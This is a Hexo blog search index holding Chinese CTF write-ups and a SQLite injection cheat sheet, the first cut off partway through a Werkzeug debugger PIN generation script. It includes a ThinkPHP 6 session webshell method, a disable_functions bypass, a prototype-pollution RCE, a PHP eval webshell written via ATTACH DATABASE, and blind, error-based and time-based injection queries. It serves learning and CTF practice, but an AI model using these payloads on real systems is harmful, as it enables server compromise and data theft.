'2485377957892',# str(uuid.getnode()),  /sys/class/net/eth0/address    '2760c403a7342785875fee2cf06c775c5d54803fe8436f19ce7b9e83281015c2'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode('utf-8')    h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None:    h.update(b'pinsalt')    num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink" title="easythink"></a>easythink</h3><p>thinkphp6.0的漏洞</p><p>thinkphp6.0 写入shell</p><p>session 如果是 32位 的话， 没有任何过滤就写入 session 文件，thinkphp6的session文件 默认在 <code>runtime</code> 目录下 ，所以 </p><p>构造 32 位 的session 最后四个 是 .php  ，</p><p>然后 就可以写入shell了，</p><p>至于shell的值 要用 $_SESSION[‘’] 这个来构造，很简单</p><p>随便一个用户名 ，用构造的session 登录 ，</p><p>然后 到<code>search</code>页面</p><p>要 <code>search</code> 的历史记录 会记录在session中 ，</p><p>然后就 蚁剑连接</p><p>需要执行 <code>/readflag</code>  才可以 读取flag  ，</p><p>但是有disable_function</p><p>就使用 php-gc 绕过disable_function ，</p><p>平时使用的 exp不行，多找几个类型的 ， 找另外一个 就成功了</p><h3 id="ezexpress"><a href="#ezexpress" class="headerlink" title="ezexpress"></a>ezexpress</h3><ul><li>admin  toLowerCase() 绕过</li><li>原型链污染</li></ul><p>merge() 函数可以原型链污染 opts 对象 outputFunctionName</p><p>做到一半 ，发现 可以上车 ，直接获取flag ，醉了<br>详情看<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlite</title>
      <link href="/2020/02/14/sqlite/"/>
      <url>/2020/02/14/sqlite/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h2><p><em>sqlite没有if和sleep语句</em></p><h3 id="sqlite的-是拼接字符串"><a href="#sqlite的-是拼接字符串" class="headerlink" title="sqlite的||是拼接字符串"></a>sqlite的||是拼接字符串</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> select 123||4;1234    </code></pre><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>–空格</p><p>/* */</p><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p><code>select column1 from table where 1=1 and 2=2</code></p><h3 id="sqlite数据类型"><a href="#sqlite数据类型" class="headerlink" title="sqlite数据类型"></a>sqlite数据类型</h3><ul><li>null</li><li>integer</li><li>real 浮点数</li><li>text 文本字符串 (utf-8,utf-16be或utf-16le 存储)</li><li>BLOB blob根据输入存储</li></ul><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="创建数据库-sqlite3-test-db"><a href="#创建数据库-sqlite3-test-db" class="headerlink" title="创建数据库: $sqlite3 test.db"></a>创建数据库: <code>$sqlite3 test.db</code></h4><p>会在当前目录创建 test.db</p><pre><code>sqlite&gt; .databases #检查是否在数据库列表main: /root/download/test.db</code></pre><h4 id="ATTACH附加数据库，如果没有则会创建"><a href="#ATTACH附加数据库，如果没有则会创建" class="headerlink" title="ATTACH附加数据库，如果没有则会创建"></a>ATTACH附加数据库，如果没有则会创建</h4><ul><li>可以利用这个来写shell<pre class=" language-aidl"><code class="language-aidl">sqlite> ATTACH DATABASE '/root/download/shell.db' as 'haah';sqlite> .databasemain: /root/download/test.dbhaah: /root/download/shell.db</code></pre></li></ul><h3 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> .dump #显示PRAGMA foreign_keys=OFF;BEGIN TRANSACTION;COMMIT;</code></pre><pre class=" language-aidl"><code class="language-aidl">$sqlite3 testdb.db .dump >123.sql #导出到文件中 </code></pre><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><h4 id="table"><a href="#table" class="headerlink" title=".table"></a>.table</h4><p>查看表</p><h4 id="insert，select，update和mysql类似"><a href="#insert，select，update和mysql类似" class="headerlink" title="insert，select，update和mysql类似"></a>insert，select，update和mysql类似</h4><h4 id="create-table"><a href="#create-table" class="headerlink" title="create table"></a>create table</h4><pre class=" language-aidl"><code class="language-aidl">CREATE TABLE `vote` (  `id` INTEGER PRIMARY KEY AUTOINCREMENT,  `name` TEXT NOT NULL,  `count` INTEGER);</code></pre><h4 id="insert-table"><a href="#insert-table" class="headerlink" title="insert table"></a>insert table</h4><pre class=" language-aidl"><code class="language-aidl">INSERT INTO `vote` (`name`, `count`) VALUES  ('dog', 0),  ('cat', 0),  ('zebra', 0),  ('koala', 0);</code></pre><h3 id="GLOB-类似like"><a href="#GLOB-类似like" class="headerlink" title="GLOB  类似like"></a>GLOB  类似like</h3><p>GLOB对大小写敏感，而且使用linux的符号 </p><ul><li>*</li></ul><ul><li>?</li></ul><pre><code>sqlite&gt; select * from vote where name GLOB 'do?';id          name        count     ----------  ----------  ----------1           dog         0</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="abs"><a href="#abs" class="headerlink" title="abs()"></a>abs()</h4><p>如果整数是<code>-9223372036854775808</code>会溢出错误</p><h4 id="coalesce-可以多个参数，返回第一个不是null的参数"><a href="#coalesce-可以多个参数，返回第一个不是null的参数" class="headerlink" title="coalesce()可以多个参数，返回第一个不是null的参数"></a>coalesce()可以多个参数，返回第一个不是null的参数</h4><pre class=" language-cookie"><code class="language-cookie">select coalesce(null,'a','abbbb');coalesce(null,'a','a')----------------------a         </code></pre><pre class=" language-cookie"><code class="language-cookie">select coalesce(nullif(2,2),'hah');coalesce(nullif(2,2),'hah')---------------------------hah              </code></pre><p>相当于 if 2=2 return hah else null</p><h4 id="hex-char"><a href="#hex-char" class="headerlink" title="hex,char"></a>hex,char</h4><h4 id="nullif-和-ifnull"><a href="#nullif-和-ifnull" class="headerlink" title="nullif 和 ifnull"></a>nullif 和 ifnull</h4><ul><li>nullif</li></ul><p>两个参数，nullif(a,b),如果a和b相等返回 null</p><p>如果a和b不想等，返回 a</p><ul><li>ifnull </li></ul><p>和 <code>coalesce()</code>类似，不过只能两个参数，返回第一个非null</p><p>如果都为null，返回null</p><h4 id="instr-a-b"><a href="#instr-a-b" class="headerlink" title="instr(a,b)"></a>instr(a,b)</h4><p>返回<code>b</code>在<code>a</code>出现的位置</p><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><h4 id="lower和-upper"><a href="#lower和-upper" class="headerlink" title="lower和 upper"></a>lower和 upper</h4><h4 id="max-a-b"><a href="#max-a-b" class="headerlink" title="max(a,b)"></a>max(a,b)</h4><h4 id="like-a-b"><a href="#like-a-b" class="headerlink" title="like(a,b)"></a>like(a,b)</h4><p>相当于 <code>b</code> like <code>a</code></p><p>可以用 _ % </p><pre><code>sqlite&gt; select like('ab_','abc');like('ab_','abc')-----------------1          </code></pre><ul><li>like可以有第三个参数，</li></ul><p>相当于like语句的 ESCAPE ，转义</p><p>在 <code>%</code> 或者 <code>_</code> 前面添加什么字符可以把 <code>%</code>或者 <code>_</code>当作字符串</p><p>而不是匹配符号 </p><pre class=" language-cookie"><code class="language-cookie">sqlite> select like('barz_','bar_','z');like('barz_','bar_','z')------------------------1             </code></pre><p>这里把 z 用作 和 \ 类似的作用</p><h4 id="ltrim-a-和-ltrim-a-b"><a href="#ltrim-a-和-ltrim-a-b" class="headerlink" title="ltrim(a) 和 ltrim(a,b)"></a>ltrim(a) 和 ltrim(a,b)</h4><p>删除左侧字符串</p><ul><li>一个参数 返回删除左侧空格的字符串</li><li>两个参数 a,b ，返回删除空格和第二个参数<code>b</code>字符串<pre class=" language-cookie"><code class="language-cookie">sqlite> SELECT ltrim('aaaa bc','a');ltrim('aaaa bc','a')bc</code></pre></li></ul><h4 id="rtrim-a-和-rtrim-a-b-和ltrim类似"><a href="#rtrim-a-和-rtrim-a-b-和ltrim类似" class="headerlink" title="rtrim(a)和 rtrim(a,b) 和ltrim类似"></a>rtrim(a)和 rtrim(a,b) 和ltrim类似</h4><h4 id="trim-就是-rtrim-ltrim"><a href="#trim-就是-rtrim-ltrim" class="headerlink" title="trim 就是 rtrim + ltrim"></a>trim 就是 rtrim + ltrim</h4><h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>和普通的 格式化字符串一样 ，</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select printf("aw%s",'sl');printf("aw%s",'sl')awsl</code></pre><h4 id="quote-a"><a href="#quote-a" class="headerlink" title="quote(a)"></a>quote(a)</h4><p>将字符串 带上 ‘ ‘ </p><pre class=" language-cookie"><code class="language-cookie">平常：sqlite> select 1233;1233      ----------1233      quote:sqlite> SELECT quote('1233');quote('1233')-------------'1233'    </code></pre><h4 id="random"><a href="#random" class="headerlink" title="random()"></a>random()</h4><p>返回随机数</p><h4 id="randomblob-a"><a href="#randomblob-a" class="headerlink" title="randomblob(a)"></a>randomblob(a)</h4><p>返回 a个字节的 blob</p><p>如果很长可以造成时间盲注</p><h4 id="replace-a-b-c"><a href="#replace-a-b-c" class="headerlink" title="replace(a,b,c)"></a>replace(a,b,c)</h4><p>把 a中的 b换成c</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select replace('a{ab}','a','b');replace('a{ab}','a','b')------------------------b{bb}            </code></pre><h4 id="soundex"><a href="#soundex" class="headerlink" title="soundex()"></a>soundex()</h4><p>返回字符串的 <code>soundex</code>编码 ，很迷</p><p>开眼界了</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select soundex('a');soundex('a')------------A000       </code></pre><h4 id="sqlite-version-版本"><a href="#sqlite-version-版本" class="headerlink" title="sqlite_version() 版本"></a>sqlite_version() 版本</h4><h4 id="substr-和mysql"><a href="#substr-和mysql" class="headerlink" title="substr() 和mysql"></a>substr() 和mysql</h4><h4 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h4><p>返回字符串类型</p><h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode()"></a>unicode()</h4><p>返回第一个字符的<code>unicode</code> 数字</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select unicode('a');unicode('a')------------97         sqlite> select unicode('哈');unicode('哈')------------21704     </code></pre><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="写shell-需要叠堆注入"><a href="#写shell-需要叠堆注入" class="headerlink" title="写shell 需要叠堆注入"></a>写shell 需要叠堆注入</h3><pre class=" language-aidl"><code class="language-aidl">ATTACH DATABASE '/tmp/good.php' as 'm0on';CREATE TABLE m0on.shell_haha(`haha` text);INSERT INTO m0on.shell_haha (haha) VALUES ('<?php eval($_POST[cmd]);?>');</code></pre><p>cat /tmp/good.php</p><pre><code>��A&lt;?php eval($_POST[cmd]);?&gt;</code></pre><h3 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h3><pre class=" language-cookie"><code class="language-cookie">select name from sqlite_master where type='table';select tbl_name from sqlite_master where type='table';</code></pre><h3 id="获取-表的结构，包括列名"><a href="#获取-表的结构，包括列名" class="headerlink" title="获取 表的结构，包括列名"></a>获取 表的结构，包括列名</h3><pre class=" language-cookie"><code class="language-cookie">select sql from sqlite_master where name='表名';sqlite> select sql from sqlite_master where name='shell';sql                             --------------------------------CREATE TABLE shell(first,second)列名是 first 和 second</code></pre><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="substr-unicode"><a href="#substr-unicode" class="headerlink" title="substr ,unicode"></a>substr ,unicode</h4><pre class=" language-cookie"><code class="language-cookie">select unicode(substr('abc',1,1));select substr('abc',1,1);</code></pre><p>使用<code>unicode()</code> 类似于 mysql的<code>ascii()</code></p><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><pre class=" language-cookie"><code class="language-cookie">select like('a%','abc');</code></pre><h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>需要扩展</p><pre class=" language-cookie"><code class="language-cookie">apt-get install sqlite3-pcre</code></pre><p>或者</p><pre class=" language-cookie"><code class="language-cookie">sqlite>  .load /usr/lib/sqlite3/pcre.so</code></pre><p>语句类似mysql不说了</p><h4 id="GLOB"><a href="#GLOB" class="headerlink" title="GLOB"></a>GLOB</h4><p>类似<code>like</code>，不过用的是unix的 * ?</p><pre class=" language-cookie"><code class="language-cookie">select 'abc' GLOb 'a*'; 'abc' GLOb 'a*'---------------1          </code></pre><h4 id="nullif-和-instr"><a href="#nullif-和-instr" class="headerlink" title="nullif 和 instr()"></a>nullif 和 instr()</h4><p>instr(a,b) 返回 b第一次出现在a的地方 ，</p><p>和<code>nullif()</code>一起用 如果是出现在<code>1</code>就返回null</p><pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','z'),1); //0 </code></pre><p>如果没有匹配到会返回<code>0</code>,这就和null一样效果</p><p>为了防止这种情况，在后面加上 <code>||1</code> 拼接字符串</p><pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','b'),1)||1; // 21select nullif(instr('abca','a'),1)||1;  //nullselect nullif(instr('abca','ab'),1)||1; //null</code></pre><h4 id="利用-ltrim-和length-注入"><a href="#利用-ltrim-和length-注入" class="headerlink" title="利用 ltrim() 和length() 注入"></a>利用 ltrim() 和length() 注入</h4><p>使用<code>length()</code>获取字段的长度</p><pre class=" language-cookie"><code class="language-cookie">select length("vote")=4;</code></pre><pre class=" language-cookie"><code class="language-cookie">sqlite> select length(ltrim("vote","vo"))=2;</code></pre><p>然后<code>ltrim()</code> 函数从左往右爆破字符串，</p><p>如果爆破的字符串正确，那么length就会减少</p><h4 id="同理-rtrim-trim-和-length"><a href="#同理-rtrim-trim-和-length" class="headerlink" title="同理 rtrim()/trim()和 length()"></a>同理 rtrim()/trim()和 length()</h4><h4 id="replace-和length-注入"><a href="#replace-和length-注入" class="headerlink" title="replace()和length()注入"></a>replace()和length()注入</h4><p>最好前面有标识符号，<code>flag{</code> 这样<br>和 ltrim 和 rtrim类似<br>不然麻烦</p><pre class=" language-cookie"><code class="language-cookie">select  length(replace('flag{aza}','flag{a',''))=3;//1 select length(replace('flag{aza}','flag{b',''))=3;//0</code></pre><h4 id="ltrim-和-length-和nullif"><a href="#ltrim-和-length-和nullif" class="headerlink" title="ltrim() 和 length()和nullif()"></a>ltrim() 和 length()和nullif()</h4><pre class=" language-cookie"><code class="language-cookie">select nullif(length(ltrim("vote","vo")),2);</code></pre><p>nullif 和 length 和ltrim 配合</p><p>如果 正确返回<code>null</code></p><h4 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a>case when then else end</h4><pre class=" language-cookie"><code class="language-cookie">select CASE  WHEN  1=1 THEN 1 ELSE 0 END ;//1select CASE  WHEN  1=2 THEN 1 ELSE 0 END ; //0</code></pre><h4 id="利用abs-报错，ifnull-nullif"><a href="#利用abs-报错，ifnull-nullif" class="headerlink" title="利用abs()报错，ifnull(),nullif()"></a>利用abs()报错，ifnull(),nullif()</h4><ul><li><p>ifnull可以用<code>coalesce()</code>函数代替</p></li><li><p><code>abs()</code>函数存在整形溢出</p></li><li><p>当abs()参数是<code>-9223372036854775808</code>也就是<code>0x8000000000000000</code><br>就会报错</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select abs(0x99999999999999999);Error: hex literal too big: 0x99999999999999999</code></pre><p>所以基于报错的注入：</p></li></ul><p>通过nullif和ifnull来决定是否报错<br>如果 <code>1=1</code> 就报错</p><pre class=" language-cookie"><code class="language-cookie">select abs(ifnull(nullif(1,1),0x8000000000000000));Error: integer overflowselect abs(ifnull(nullif(1,2),0x8000000000000000));2</code></pre><h3 id="时间盲注-randomblob"><a href="#时间盲注-randomblob" class="headerlink" title="时间盲注 randomblob()"></a>时间盲注 randomblob()</h3><p>randomblob(n)可以产生n长度的字符串，足够长就可以延时</p><pre class=" language-cookie"><code class="language-cookie">select case when substr('abc',1,1)='a' then randomblob(1000000) else 0 end;</code></pre><h3 id="CREATE注入"><a href="#CREATE注入" class="headerlink" title="CREATE注入"></a>CREATE注入</h3><p>语句 :</p><pre><code>create table [xx] as select</code></pre><pre><code>CREATE TABLE aa as select [a1][(123] from sec_tb ;</code></pre><p>这样就是 <code>(123</code> 为列名， type 默认是 TEXT</p><p>创造一个表 <code>aa</code> ，</p><p>数据是从 <code>sec_tb</code> 的 <code>a1</code>列 复制过去的数据</p><p><strong>获取表:</strong></p><pre><code>CREATE TABLE [cc] as select [sql][(123] from sqlite_master ;</code></pre><p><strong>获取数据</strong></p><pre><code>CREATE TABLE aa as select [a1][(123] from sec_tb ;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/02/10/hello-world/"/>
      <url>/2020/02/10/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p>##写文章</p><pre><code>---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><pre class=" language-$xslt"><code class="language-$xslt">title    Markdown 的文件标题    文章标题，强烈建议填写此选项date    文件创建时的日期时间    发布时间，强烈建议填写此选项，且最好保证全局唯一author    根 _config.yml 中的 author    文章作者img    featureImages 中的某个值    文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpgtop    true    推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章cover    false    v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中coverImg    无    v1.0.2版本新增，表示该文章在首页轮播封面需**要显示的图片路径，如果没有，则默认使用文章的特色图片password    无    文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项toc    true    是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项mathjax    false    是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行summary    无    文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories    无    文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类tags    无    文章标签，一篇文章可以多个标签</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
